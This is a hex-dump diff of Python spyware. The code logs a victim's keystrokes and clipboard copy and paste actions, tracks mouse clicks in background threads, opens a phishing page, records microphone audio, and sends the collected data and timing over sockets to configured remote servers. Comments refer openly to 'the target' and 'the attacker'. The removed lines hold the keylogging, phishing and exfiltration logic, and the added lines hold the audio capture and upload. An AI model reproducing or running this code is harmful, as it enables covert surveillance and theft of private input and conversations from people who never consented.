-00002310: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002320: 2022 3922 3a20 2229 222c 2022 3022 3a20   "9": ")", "0": 
-00002330: 223d 222c 2022 c39f 223a 2022 3f22 7d0d  "=", "..": "?"}.
-00002340: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002350: 2069 6620 7365 6c66 2e63 6170 7320 6973   if self.caps is
-00002360: 2054 7275 653a 0d0a 2020 2020 2020 2020   True:..        
-00002370: 2020 2020 2020 2020 2020 2020 6966 206b              if k
-00002380: 6579 2e63 6861 7220 696e 206f 7468 6572  ey.char in other
-00002390: 5f63 6861 7265 6374 6572 733a 0d0a 2020  _charecters:..  
-000023a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000023b0: 2020 2020 2020 7365 6c66 2e77 6f72 6420        self.word 
-000023c0: 3d20 6f74 6865 725f 6368 6172 6563 7465  = other_charecte
-000023d0: 7273 5b6b 6579 2e63 6861 725d 0d0a 2020  rs[key.char]..  
-000023e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000023f0: 2020 2020 2020 2320 5570 7065 7220 4368        # Upper Ch
-00002400: 6172 6163 7465 7273 2066 726f 6d20 2231  aracters from "1
-00002410: 2220 746f 2022 3022 2062 6563 6175 7365  " to "0" because
-00002420: 2061 6c6c 2074 6869 7320 6e75 6d62 6572   all this number
-00002430: 7320 6172 6520 6e6f 7420 6368 6172 6563  s are not charec
-00002440: 7465 7273 2061 7265 206e 6f74 2069 6e20  ters are not in 
-00002450: 7079 6e70 7574 0d0a 2020 2020 2020 2020  pynput..        
-00002460: 2020 2020 2020 2020 2020 2020 656c 7365              else
-00002470: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
-00002480: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-00002490: 776f 7264 203d 206b 6579 2e63 6861 722e  word = key.char.
-000024a0: 7570 7065 7228 290d 0a20 2020 2020 2020  upper()..       
-000024b0: 2020 2020 2020 2020 2065 6c73 653a 0d0a           else:..
-000024c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000024d0: 2020 2020 7365 6c66 2e77 6f72 6420 3d20      self.word = 
-000024e0: 6b65 792e 6368 6172 0d0a 0d0a 2020 2020  key.char....    
-000024f0: 2020 2020 2020 2020 2020 2020 616c 6c5f              all_
-00002500: 7265 715f 6b65 7973 203d 207b 2203 223a  req_keys = {".":
-00002510: 2073 656c 662e 636f 7079 5f64 6174 612c   self.copy_data,
-00002520: 2022 1622 3a20 7365 6c66 2e61 7070 656e   ".": self.appen
-00002530: 645f 7061 7374 657d 0d0a 2020 2020 2020  d_paste}..      
-00002540: 2020 2020 2020 2020 2020 2320 2245 5458            # "ETX
-00002550: 2220 7374 616e 6473 2066 6f72 2022 456e  " stands for "En
-00002560: 642d 5465 7874 2d63 6861 7261 6374 6572  d-Text-character
-00002570: 2220 616e 6420 6973 2061 2063 6f6e 7472  " and is a contr
-00002580: 6f6c 2063 6861 7261 6374 6572 2077 6869  ol character whi
-00002590: 6368 206b 6e6f 7773 2074 6865 2063 6861  ch knows the cha
-000025a0: 7261 6374 6572 206f 6620 636f 7079 696e  racter of copyin
-000025b0: 6720 736f 6d65 7468 696e 6720 6f6e 2074  g something on t
-000025c0: 6865 206b 6579 626f 6172 640d 0a20 2020  he keyboard..   
-000025d0: 2020 2020 2020 2020 2020 2020 2023 2022               # "
-000025e0: 5359 4e22 2073 7461 6e64 7320 666f 7220  SYN" stands for 
-000025f0: 2253 796e 6368 726f 6e6f 7573 2049 646c  "Synchronous Idl
-00002600: 6522 2061 6e64 2069 7320 6120 636f 6e74  e" and is a cont
-00002610: 726f 6c20 6368 6172 6163 7465 7220 7768  rol character wh
-00002620: 6963 6820 6b6e 6f77 7320 7468 6520 6368  ich knows the ch
-00002630: 6172 6163 7465 7220 6f66 2070 6173 7469  aracter of pasti
-00002640: 6e67 2073 6f6d 6574 6869 6e67 206f 6e20  ng something on 
-00002650: 7468 6520 6b65 7962 6f61 7264 0d0a 2020  the keyboard..  
-00002660: 2020 2020 2020 2020 2020 2020 2020 666f                fo
-00002670: 7220 6561 6368 5f6b 6579 2069 6e20 616c  r each_key in al
-00002680: 6c5f 7265 715f 6b65 7973 3a0d 0a20 2020  l_req_keys:..   
-00002690: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000026a0: 2069 6620 6561 6368 5f6b 6579 203d 3d20   if each_key == 
-000026b0: 6b65 792e 6368 6172 3a0d 0a20 2020 2020  key.char:..     
-000026c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000026d0: 2020 2023 2049 6620 7468 6520 636f 7079     # If the copy
-000026e0: 2063 6861 7261 6374 6572 2069 7320 7072   character is pr
-000026f0: 6573 7365 642c 2065 6163 6820 6675 6e63  essed, each func
-00002700: 7469 6f6e 206f 6620 6561 6368 2063 6861  tion of each cha
-00002710: 7261 6374 6572 2077 696c 6c20 6265 2077  racter will be w
-00002720: 6f72 6b69 6e67 0d0a 2020 2020 2020 2020  orking..        
-00002730: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002740: 616c 6c5f 7265 715f 6b65 7973 5b65 6163  all_req_keys[eac
-00002750: 685f 6b65 795d 2829 0d0a 2020 2020 2020  h_key]()..      
-00002760: 2020 2020 2020 2020 2020 7472 793a 0d0a            try:..
-00002770: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002780: 2020 2020 6173 6369 5f6e 756d 6265 7220      asci_number 
-00002790: 3d20 6f72 6428 7365 6c66 2e77 6f72 6429  = ord(self.word)
-000027a0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-000027b0: 2020 2020 2020 2320 4f72 6469 6e61 6c20        # Ordinal 
-000027c0: 6e75 6d62 6572 2069 6e20 7468 6520 7261  number in the ra
-000027d0: 6e67 6520 6f66 2030 2074 6f20 3331 2063  nge of 0 to 31 c
-000027e0: 6f6d 706c 6574 6573 2061 6c6c 2073 7065  ompletes all spe
-000027f0: 6369 616c 2063 6861 7261 6374 6572 7320  cial characters 
-00002800: 7769 7468 2074 6865 206b 6579 2022 7374  with the key "st
-00002810: 7267 202b 206c 6574 7465 7222 0d0a 2020  rg + letter"..  
-00002820: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002830: 2020 6966 2061 7363 695f 6e75 6d62 6572    if asci_number
-00002840: 206e 6f74 2069 6e20 7261 6e67 6528 302c   not in range(0,
-00002850: 2033 3229 3a0d 0a20 2020 2020 2020 2020   32):..         
-00002860: 2020 2020 2020 2020 2020 2020 2020 2023                 #
-00002870: 2069 6620 7468 6572 6520 6973 206e 6f20   if there is no 
-00002880: 7370 6563 6961 6c20 6368 6172 6163 7465  special characte
-00002890: 7220 6974 206a 7573 7420 7072 696e 7473  r it just prints
-000028a0: 2074 6865 2061 6c70 6861 6265 7469 6320   the alphabetic 
-000028b0: 6e75 6d62 6572 0d0a 2020 2020 2020 2020  number..        
-000028c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000028d0: 7365 6c66 2e70 7269 6e74 5f77 6f72 6b28  self.print_work(
-000028e0: 7365 6c66 2e77 6f72 6429 0d0a 0d0a 2020  self.word)....  
-000028f0: 2020 2020 2020 2020 2020 2020 2020 6578                ex
-00002900: 6365 7074 2054 7970 6545 7272 6f72 3a0d  cept TypeError:.
-00002910: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002920: 2020 2020 2023 2070 7269 6e74 7320 7468       # prints th
-00002930: 6520 616c 7068 6162 6574 6320 6e75 6d62  e alphabetc numb
-00002940: 6572 0d0a 2020 2020 2020 2020 2020 2020  er..            
-00002950: 2020 2020 2020 2020 7365 6c66 2e70 7269          self.pri
-00002960: 6e74 5f77 6f72 6b28 7365 6c66 2e77 6f72  nt_work(self.wor
-00002970: 6429 0d0a 0d0a 2020 2020 2020 2020 2020  d)....          
-00002980: 2020 2020 2020 7072 696e 7428 7365 6c66        print(self
-00002990: 2e72 6963 6874 6967 655f 6c69 7374 6529  .richtige_liste)
-000029a0: 0d0a 2020 2020 2020 2020 2020 2020 6578  ..            ex
-000029b0: 6365 7074 2054 7970 6545 7272 6f72 3a0d  cept TypeError:.
-000029c0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000029d0: 2070 6173 730d 0a0d 0a20 2020 2020 2020   pass....       
-000029e0: 2065 7863 6570 7420 4174 7472 6962 7574   except Attribut
-000029f0: 6545 7272 6f72 3a0d 0a20 2020 2020 2020  eError:..       
-00002a00: 2020 2020 2070 7269 6e74 2866 2741 6e20       print(f'An 
-00002a10: 6f74 6865 7220 6b65 7920 7761 7320 7072  other key was pr
-00002a20: 6573 7365 643a 207b 6b65 797d 2729 0d0a  essed: {key}')..
-00002a30: 2020 2020 2020 2020 2020 2020 6966 206b              if k
-00002a40: 6579 203d 3d20 6b65 7962 6f61 7264 2e4b  ey == keyboard.K
-00002a50: 6579 2e73 7061 6365 206f 7220 6b65 7920  ey.space or key 
-00002a60: 3d3d 206b 6579 626f 6172 642e 4b65 792e  == keyboard.Key.
-00002a70: 7461 623a 0d0a 2020 2020 2020 2020 2020  tab:..          
-00002a80: 2020 2020 2020 7365 6c66 2e72 6963 6874        self.richt
-00002a90: 6967 655f 6c69 7374 6520 2b3d 2022 7b22  ige_liste += "{"
-00002aa0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002ab0: 2020 2320 4966 2074 6865 2074 6172 6765    # If the targe
-00002ac0: 7420 7072 6573 7365 7320 7461 6220 6f72  t presses tab or
-00002ad0: 2073 7061 6365 2061 2022 7b22 2077 696c   space a "{" wil
-00002ae0: 6c20 6265 2061 7070 656e 6465 6420 746f  l be appended to
-00002af0: 2074 6865 206c 6973 7420 736f 2074 6865   the list so the
-00002b00: 2061 7474 6163 6b65 7220 6b6e 6f77 7320   attacker knows 
-00002b10: 7768 656e 2061 6e64 0d0a 2020 2020 2020  when and..      
-00002b20: 2020 2020 2020 2020 2020 2320 7370 6163            # spac
-00002b30: 6520 6f72 2061 2074 6162 206b 6579 2068  e or a tab key h
-00002b40: 6173 2062 6565 6e20 7072 6573 7365 640d  as been pressed.
-00002b50: 0a20 2020 2020 2020 2020 2020 2065 6c69  .            eli
-00002b60: 6620 6b65 7920 3d3d 206b 6579 626f 6172  f key == keyboar
-00002b70: 642e 4b65 792e 6361 7073 5f6c 6f63 6b3a  d.Key.caps_lock:
-00002b80: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002b90: 2020 7365 6c66 2e63 6170 7320 3d20 5472    self.caps = Tr
-00002ba0: 7565 0d0a 2020 2020 2020 2020 2020 2020  ue..            
-00002bb0: 2020 2020 7365 6c66 2e63 6865 636b 2e61      self.check.a
-00002bc0: 7070 656e 6428 3129 0d0a 2020 2020 2020  ppend(1)..      
-00002bd0: 2020 2020 2020 6368 6563 6b5f 6361 7073        check_caps
-00002be0: 203d 2073 756d 2873 656c 662e 6368 6563   = sum(self.chec
-00002bf0: 6b29 202f 2032 0d0a 2020 2020 2020 2020  k) / 2..        
-00002c00: 2020 2020 2320 4966 2063 6865 636b 5f63      # If check_c
-00002c10: 6170 7320 6973 206e 6f74 2070 7269 6d61  aps is not prima
-00002c20: 7279 2069 7420 7769 6c6c 2073 6574 2073  ry it will set s
-00002c30: 656c 662e 6361 7073 2074 6f20 4661 6c73  elf.caps to Fals
-00002c40: 650d 0a0d 0a20 2020 2020 2020 2020 2020  e....           
-00002c50: 2069 6620 7374 7228 6368 6563 6b5f 6361   if str(check_ca
-00002c60: 7073 295b 2d31 5d20 213d 2027 3027 3a0d  ps)[-1] != '0':.
-00002c70: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002c80: 2070 6173 730d 0a20 2020 2020 2020 2020   pass..         
-00002c90: 2020 2065 6c73 653a 0d0a 2020 2020 2020     else:..      
-00002ca0: 2020 2020 2020 2020 2020 7365 6c66 2e63            self.c
-00002cb0: 6170 7320 3d20 4661 6c73 650d 0a20 2020  aps = False..   
-00002cc0: 2020 2020 2020 2020 2020 2020 2023 2054               # T
-00002cd0: 6869 7320 7265 7365 7473 2065 7665 7279  his resets every
-00002ce0: 7468 696e 670d 0a0d 0a20 2020 2020 2020  thing....       
-00002cf0: 2020 2020 2069 6620 6b65 7920 3d3d 206b       if key == k
-00002d00: 6579 626f 6172 642e 4b65 792e 6261 636b  eyboard.Key.back
-00002d10: 7370 6163 653a 0d0a 2020 2020 2020 2020  space:..        
-00002d20: 2020 2020 2020 2020 6474 203d 2064 6174          dt = dat
-00002d30: 6574 696d 652e 6e6f 7728 290d 0a20 2020  etime.now()..   
-00002d40: 2020 2020 2020 2020 2020 2020 2023 2047               # G
-00002d50: 6574 7320 7468 6520 6375 7272 656e 7420  ets the current 
-00002d60: 7469 6d65 0d0a 2020 2020 2020 2020 2020  time..          
-00002d70: 2020 2020 2020 6765 745f 7469 6d65 203d        get_time =
-00002d80: 2073 7472 2864 7429 2e73 706c 6974 2822   str(dt).split("
-00002d90: 3a22 290d 0a20 2020 2020 2020 2020 2020  :")..           
-00002da0: 2020 2020 2023 2054 6869 7320 7370 6c69       # This spli
-00002db0: 7473 2074 6865 2074 696d 6520 736f 2074  ts the time so t
-00002dc0: 6865 206d 696e 7574 6573 2061 6e64 2073  he minutes and s
-00002dd0: 6563 6f6e 6473 2061 7265 2064 6973 706c  econds are displ
-00002de0: 6179 6564 0d0a 0d0a 2020 2020 2020 2020  ayed....        
-00002df0: 2020 2020 2020 2020 686f 7572 2c20 6d69          hour, mi
-00002e00: 6e75 7465 732c 2073 6563 203d 2069 6e74  nutes, sec = int
-00002e10: 2867 6574 5f74 696d 655b 305d 5b3a 3a2d  (get_time[0][::-
-00002e20: 315d 5b30 3a32 5d5b 3a3a 2d31 5d29 2c20  1][0:2][::-1]), 
-00002e30: 696e 7428 6765 745f 7469 6d65 5b31 5d29  int(get_time[1])
-00002e40: 2c20 666c 6f61 7428 6765 745f 7469 6d65  , float(get_time
-00002e50: 5b32 5d29 0d0a 2020 2020 2020 2020 2020  [2])..          
-00002e60: 2020 2020 2020 2320 4765 7473 2074 6865        # Gets the
-00002e70: 2063 7572 7265 6e74 2068 6f75 722c 206d   current hour, m
-00002e80: 696e 7574 6520 616e 6420 7365 636f 6e64  inute and second
-00002e90: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
-00002ea0: 2020 2020 616c 6c20 3d20 686f 7572 202a      all = hour *
-00002eb0: 2033 3630 3020 2b20 6d69 6e75 7465 7320   3600 + minutes 
-00002ec0: 2a20 3630 202b 2073 6563 0d0a 2020 2020  * 60 + sec..    
-00002ed0: 2020 2020 2020 2020 2020 2020 2320 4765              # Ge
-00002ee0: 7473 2074 6865 2073 6563 6f6e 6473 206f  ts the seconds o
-00002ef0: 6620 6576 6572 7974 6869 6e67 2066 726f  f everything fro
-00002f00: 6d20 686f 7572 2074 6f20 7365 636f 6e64  m hour to second
-00002f10: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002f20: 2020 6966 206e 6f74 2073 656c 662e 7365    if not self.se
-00002f30: 636f 6e64 733a 0d0a 2020 2020 2020 2020  conds:..        
-00002f40: 2020 2020 2020 2020 2020 2020 2320 4966              # If
-00002f50: 2074 6865 7265 2069 7320 6e6f 7468 696e   there is nothin
-00002f60: 6720 696e 2074 6865 206c 6973 7420 7365  g in the list se
-00002f70: 636f 6e64 2077 696c 6c20 6265 2061 7070  cond will be app
-00002f80: 616e 6465 640d 0a20 2020 2020 2020 2020  anded..         
-00002f90: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-00002fa0: 7365 636f 6e64 732e 6170 7065 6e64 2861  seconds.append(a
-00002fb0: 6c6c 290d 0a20 2020 2020 2020 2020 2020  ll)..           
-00002fc0: 2020 2020 206d 696e 7573 203d 2061 6c6c       minus = all
-00002fd0: 202d 2073 656c 662e 7365 636f 6e64 735b   - self.seconds[
-00002fe0: 305d 0d0a 2020 2020 2020 2020 2020 2020  0]..            
-00002ff0: 2020 2020 2320 5468 6973 2063 6865 636b      # This check
-00003000: 7320 6966 2074 6865 2074 6172 6765 7420  s if the target 
-00003010: 6973 2068 6f6c 6469 6e67 2074 6865 2062  is holding the b
-00003020: 6163 6b73 7061 6365 206b 6579 0d0a 2020  ackspace key..  
-00003030: 2020 2020 2020 2020 2020 2020 2020 6966                if
-00003040: 206d 696e 7573 203e 2030 2e30 3520 6f72   minus > 0.05 or
-00003050: 206d 696e 7573 203d 3d20 302e 303a 0d0a   minus == 0.0:..
-00003060: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003070: 2020 2020 6966 2073 656c 662e 7269 6368      if self.rich
-00003080: 7469 6765 5f6c 6973 7465 3a0d 0a20 2020  tige_liste:..   
-00003090: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000030a0: 2020 2020 2073 656c 662e 7269 6368 7469       self.richti
-000030b0: 6765 5f6c 6973 7465 2e70 6f70 282d 3129  ge_liste.pop(-1)
-000030c0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-000030d0: 2020 2020 2020 2020 2020 2320 5265 6d6f            # Remo
-000030e0: 7665 7320 7468 6520 6c61 7374 2069 7465  ves the last ite
-000030f0: 6d20 6f66 2074 6865 206c 6973 740d 0a0d  m of the list...
-00003100: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00003110: 2073 656c 662e 7365 636f 6e64 735b 305d   self.seconds[0]
-00003120: 203d 2061 6c6c 0d0a 2020 2020 2020 2020   = all..        
-00003130: 2020 2020 2020 2020 2320 4c69 7374 2077          # List w
-00003140: 696c 6c20 616c 6c77 6179 7320 6265 2075  ill allways be u
-00003150: 7064 6174 6564 0d0a 0d0a 2020 2020 6465  pdated....    de
-00003160: 6620 6f6e 5f72 656c 6561 7365 2873 656c  f on_release(sel
-00003170: 662c 206b 6579 293a 0d0a 2020 2020 2020  f, key):..      
-00003180: 2020 7072 696e 7428 6627 4b65 7920 7265    print(f'Key re
-00003190: 6c65 6173 6564 3a20 7b6b 6579 7d27 290d  leased: {key}').
-000031a0: 0a0d 0a20 2020 2064 6566 2073 7461 7274  ...    def start
-000031b0: 2873 656c 6629 3a0d 0a20 2020 2020 2020  (self):..       
-000031c0: 2069 6620 7365 6c66 2e70 6869 7368 696e   if self.phishin
-000031d0: 6720 6973 206e 6f74 204e 6f6e 653a 0d0a  g is not None:..
-000031e0: 2020 2020 2020 2020 2020 2020 7768 696c              whil
-000031f0: 6520 5472 7565 3a0d 0a20 2020 2020 2020  e True:..       
-00003200: 2020 2020 2020 2020 2074 7279 3a0d 0a20           try:.. 
-00003210: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003220: 2020 2072 6573 706f 6e73 6520 3d20 7265     response = re
-00003230: 7175 6573 7473 2e67 6574 2873 656c 662e  quests.get(self.
-00003240: 7068 6973 6869 6e67 290d 0a20 2020 2020  phishing)..     
-00003250: 2020 2020 2020 2020 2020 2020 2020 2023                 #
-00003260: 2052 6573 706f 6e65 2069 7320 6865 7265   Respone is here
-00003270: 2074 6f20 7365 6520 6966 2074 6865 2077   to see if the w
-00003280: 6562 7369 7465 2069 7320 6f6e 6c69 6e65  ebsite is online
-00003290: 206f 7220 6e6f 740d 0a20 2020 2020 2020   or not..       
-000032a0: 2020 2020 2020 2020 2020 2020 2077 6562               web
-000032b0: 6272 6f77 7365 722e 6f70 656e 2873 656c  browser.open(sel
-000032c0: 662e 7068 6973 6869 6e67 290d 0a20 2020  f.phishing)..   
-000032d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000032e0: 2062 7265 616b 0d0a 0d0a 2020 2020 2020   break....      
-000032f0: 2020 2020 2020 2020 2020 6578 6365 7074            except
-00003300: 2072 6571 7565 7374 732e 6578 6365 7074   requests.except
-00003310: 696f 6e73 2e43 6f6e 6e65 6374 696f 6e45  ions.ConnectionE
-00003320: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
-00003330: 2020 2020 2020 2020 2020 2070 7269 6e74             print
-00003340: 2822 4e6f 2063 6f6e 6e65 6374 696f 6e22  ("No connection"
-00003350: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00003360: 2020 2020 2020 2073 7973 2e65 7869 7428         sys.exit(
-00003370: 290d 0a0d 0a20 2020 2020 2020 206c 6973  )....        lis
-00003380: 7465 6e69 6e67 5f74 6872 6561 6420 3d20  tening_thread = 
-00003390: 7468 7265 6164 696e 672e 5468 7265 6164  threading.Thread
-000033a0: 2874 6172 6765 743d 7365 6c66 2e64 6174  (target=self.dat
-000033b0: 656e 5f61 7566 6e65 6865 6d65 6e29 0d0a  en_aufnehemen)..
-000033c0: 2020 2020 2020 2020 2320 5468 6973 2072          # This r
-000033d0: 756e 7320 7468 6520 7072 6f67 7261 6d6d  uns the programm
-000033e0: 2062 6568 696e 6420 7468 6520 6163 7475   behind the actu
-000033f0: 616c 2070 726f 6772 616d 6d69 6e67 0d0a  al programming..
-00003400: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
-00003410: 675f 7468 7265 6164 2e73 7461 7274 2829  g_thread.start()
-00003420: 0d0a 0d0a 2020 2020 2020 2020 7468 7265  ....        thre
-00003430: 6164 696e 675f 6d6f 7573 6520 3d20 7468  ading_mouse = th
-00003440: 7265 6164 696e 672e 5468 7265 6164 2874  reading.Thread(t
-00003450: 6172 6765 743d 7365 6c66 2e61 6c6c 5f63  arget=self.all_c
-00003460: 6c69 636b 7329 0d0a 2020 2020 2020 2020  licks)..        
-00003470: 2320 5468 6973 2072 756e 7320 7468 6520  # This runs the 
-00003480: 7072 6f67 7261 6d6d 2062 6568 696e 6420  programm behind 
-00003490: 7468 6520 6163 7475 616c 2070 726f 6772  the actual progr
-000034a0: 616d 6d69 6e67 0d0a 2020 2020 2020 2020  amming..        
-000034b0: 7468 7265 6164 696e 675f 6d6f 7573 652e  threading_mouse.
-000034c0: 7374 6172 7428 290d 0a0d 0a20 2020 2020  start()....     
-000034d0: 2020 2073 656e 645f 7469 6d65 7220 3d20     send_timer = 
-000034e0: 736f 636b 6574 2e73 6f63 6b65 7428 736f  socket.socket(so
-000034f0: 636b 6574 2e41 465f 494e 4554 2c20 736f  cket.AF_INET, so
-00003500: 636b 6574 2e53 4f43 4b5f 5354 5245 414d  cket.SOCK_STREAM
-00003510: 290d 0a20 2020 2020 2020 2073 656e 645f  )..        send_
-00003520: 7469 6d65 722e 636f 6e6e 6563 7428 2873  timer.connect((s
-00003530: 656c 662e 6970 5f74 696d 6572 2c20 7365  elf.ip_timer, se
-00003540: 6c66 2e70 6f72 745f 7469 6d65 7229 290d  lf.port_timer)).
-00003550: 0a0d 0a20 2020 2020 2020 2073 656e 645f  ...        send_
-00003560: 7469 6d65 722e 7365 6e64 2873 7472 2873  timer.send(str(s
-00003570: 656c 662e 6475 7261 7469 6f6e 292e 656e  elf.duration).en
-00003580: 636f 6465 2829 290d 0a20 2020 2020 2020  code())..       
-00003590: 2023 2054 6869 7320 7365 6e64 7320 7468   # This sends th
-000035a0: 6520 7365 636f 6e64 7320 746f 2074 6865  e seconds to the
-000035b0: 2073 6572 7665 720d 0a20 2020 2020 2020   server..       
-000035c0: 2073 656e 645f 7469 6d65 722e 636c 6f73   send_timer.clos
-000035d0: 6528 290d 0a0d 0a20 2020 2020 2020 2074  e()....        t
-000035e0: 696d 6572 5f64 656c 6574 655f 6469 7220  imer_delete_dir 
-000035f0: 3d20 736f 636b 6574 2e73 6f63 6b65 7428  = socket.socket(
-00003600: 736f 636b 6574 2e41 465f 494e 4554 2c20  socket.AF_INET, 
-00003610: 736f 636b 6574 2e53 4f43 4b5f 5354 5245  socket.SOCK_STRE
-00003620: 414d 290d 0a20 2020 2020 2020 2074 696d  AM)..        tim
-00003630: 6572 5f64 656c 6574 655f 6469 722e 636f  er_delete_dir.co
-00003640: 6e6e 6563 7428 2822 3132 372e 302e 302e  nnect(("127.0.0.
-00003650: 3122 2c20 3130 3737 2929 0d0a 0d0a 2020  1", 1077))....  
-00003660: 2020 2020 2020 7469 6d65 725f 6465 6c65        timer_dele
-00003670: 7465 5f64 6972 2e73 656e 6428 7374 7228  te_dir.send(str(
-00003680: 7365 6c66 2e64 7572 6174 696f 6e29 2e65  self.duration).e
-00003690: 6e63 6f64 6528 2929 0d0a 2020 2020 2020  ncode())..      
-000036a0: 2020 7469 6d65 725f 6465 6c65 7465 5f64    timer_delete_d
-000036b0: 6972 2e63 6c6f 7365 2829 0d0a 0d0a 2020  ir.close()....  
-000036c0: 2020 2020 2020 7769 7468 206b 6579 626f        with keybo
-000036d0: 6172 642e 4c69 7374 656e 6572 286f 6e5f  ard.Listener(on_
-000036e0: 7072 6573 733d 7365 6c66 2e6f 6e5f 7072  press=self.on_pr
-000036f0: 6573 732c 206f 6e5f 7265 6c65 6173 653d  ess, on_release=
-00003700: 7365 6c66 2e6f 6e5f 7265 6c65 6173 6529  self.on_release)
-00003710: 2061 7320 6c69 7374 656e 6572 3a0d 0a20   as listener:.. 
-00003720: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-00003730: 636f 756e 7464 6f77 6e5f 7365 6e64 2873  countdown_send(s
-00003740: 656c 662e 6475 7261 7469 6f6e 2c20 7365  elf.duration, se
-00003750: 6c66 2e69 705f 7068 6f74 6f73 2c20 7365  lf.ip_photos, se
-00003760: 6c66 2e70 6f72 745f 7068 6f74 6f73 2c20  lf.port_photos, 
-00003770: 7365 6c66 2e69 705f 6b65 796c 6f67 6765  self.ip_keylogge
-00003780: 722c 0d0a 2020 2020 2020 2020 2020 2020  r,..            
-00003790: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000037a0: 2020 2020 7365 6c66 2e70 6f72 745f 6b65      self.port_ke
-000037b0: 796c 6f67 6765 7229 0d0a 2020 2020 2020  ylogger)..      
-000037c0: 2020 2020 2020 6c69 7374 656e 6572 2e6a        listener.j
-000037d0: 6f69 6e28 290d 0a20 2020 2020 2020 2020  oin()..         
-000037e0: 2020 2023 2054 6869 7320 6c69 7374 656e     # This listen
-000037f0: 7320 746f 2074 6865 206b 6579 7320 7468  s to the keys th
-00003800: 6174 2077 6865 7265 2074 7970 6564 0d0a  at where typed..
+00000830: 2020 2020 2020 2020 2020 2072 6174 653d             rate=
+00000840: 7261 7465 2c20 696e 7075 743d 5472 7565  rate, input=True
+00000850: 2c0d 0a20 2020 2020 2020 2020 2020 2020  ,..             
+00000860: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000870: 2020 2066 7261 6d65 735f 7065 725f 6275     frames_per_bu
+00000880: 6666 6572 3d63 6875 6e6b 290d 0a20 2020  ffer=chunk)..   
+00000890: 2020 2020 2020 2020 2023 2070 7269 6e74           # print
+000008a0: 2822 7265 636f 7264 696e 672e 2e2e 2229  ("recording...")
+000008b0: 0d0a 2020 2020 2020 2020 2020 2020 6672  ..            fr
+000008c0: 616d 6573 203d 205b 5d0d 0a0d 0a20 2020  ames = []....   
+000008d0: 2020 2020 2020 2020 2066 6f72 2069 2069           for i i
+000008e0: 6e20 7261 6e67 6528 302c 2069 6e74 2872  n range(0, int(r
+000008f0: 6174 6520 2f20 6368 756e 6b20 2a20 7365  ate / chunk * se
+00000900: 636f 6e64 7329 293a 0d0a 2020 2020 2020  conds)):..      
+00000910: 2020 2020 2020 2020 2020 6461 7461 203d            data =
+00000920: 2073 7472 6561 6d2e 7265 6164 2863 6875   stream.read(chu
+00000930: 6e6b 290d 0a20 2020 2020 2020 2020 2020  nk)..           
+00000940: 2020 2020 2066 7261 6d65 732e 6170 7065       frames.appe
+00000950: 6e64 2864 6174 6129 0d0a 0d0a 2020 2020  nd(data)....    
+00000960: 2020 2020 2020 2020 2320 7072 696e 7428          # print(
+00000970: 2266 696e 6973 6865 6420 7265 636f 7264  "finished record
+00000980: 696e 6722 290d 0a0d 0a20 2020 2020 2020  ing")....       
+00000990: 2020 2020 2023 2073 746f 7020 5265 636f       # stop Reco
+000009a0: 7264 696e 670d 0a20 2020 2020 2020 2020  rding..         
+000009b0: 2020 2073 7472 6561 6d2e 7374 6f70 5f73     stream.stop_s
+000009c0: 7472 6561 6d28 290d 0a20 2020 2020 2020  tream()..       
+000009d0: 2020 2020 2073 7472 6561 6d2e 636c 6f73       stream.clos
+000009e0: 6528 290d 0a20 2020 2020 2020 2020 2020  e()..           
+000009f0: 2061 7564 696f 2e74 6572 6d69 6e61 7465   audio.terminate
+00000a00: 2829 0d0a 0d0a 2020 2020 2020 2020 2020  ()....          
+00000a10: 2020 2320 436f 6e6e 6563 7469 6f6e 2077    # Connection w
+00000a20: 6974 6820 5365 7276 6572 4c69 7374 656e  ith ServerListen
+00000a30: 6572 0d0a 0d0a 2020 2020 2020 2020 2020  er....          
+00000a40: 2020 7365 6c66 2e66 7261 6d65 7320 3d20    self.frames = 
+00000a50: 7374 7228 6672 616d 6573 290d 0a20 2020  str(frames)..   
+00000a60: 2020 2020 2020 2020 206c 6973 7465 6e69           listeni
+00000a70: 6e67 5f64 6174 612e 7365 6e64 2873 656c  ng_data.send(sel
+00000a80: 662e 6672 616d 6573 2e65 6e63 6f64 6528  f.frames.encode(
+00000a90: 2929 0d0a 0d0a 2020 2020 2020 2020 6578  ))....        ex
+00000aa0: 6365 7074 204f 5345 7272 6f72 3a0d 0a20  cept OSError:.. 
+00000ab0: 2020 2020 2020 2020 2020 2070 7269 6e74             print
+00000ac0: 2822 4e4f 204d 4943 524f 5048 4f4e 4520  ("NO MICROPHONE 
+00000ad0: 4445 5445 4354 4544 204f 5220 4d49 4352  DETECTED OR MICR
+00000ae0: 4f50 484f 4e45 2053 4554 5449 4e47 2044  OPHONE SETTING D
+00000af0: 4953 4142 4c45 4422 290d 0a20 2020 2020  ISABLED")..     
